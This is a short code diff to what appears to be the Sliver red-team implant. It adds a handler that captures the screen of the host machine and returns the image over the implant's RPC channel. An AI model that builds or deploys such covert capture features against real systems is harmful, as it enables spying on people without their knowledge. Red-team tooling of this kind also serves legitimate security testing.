@@ -46,6 +46,8 @@ import (
 	"github.com/bishopfox/sliver/sliver/procdump"
 	"github.com/bishopfox/sliver/sliver/ps"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
+	screen "github.com/bishopfox/sliver/sliver/sc"
+
 
 	"github.com/golang/protobuf/proto"
 )
@@ -486,6 +488,26 @@ func executeHandler(data []byte, resp RPCResponse) {
 		}
 	}
 	data, err = proto.Marshal(execResp)
+	resp(data, err)
+}
+
+func screenshotHandler(data []byte, resp RPCResponse) {
+	sc := &pb.Screenshot{}
+	err := proto.Unmarshal(data, sc)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	// {{if .Debug}}
+	log.Printf("Screenshot Request")
+	// {{end}}
+
+
+	sc.Data = screen.Capture()
+	data, err = proto.Marshal(sc)
+
 	resp(data, err)
 }
 
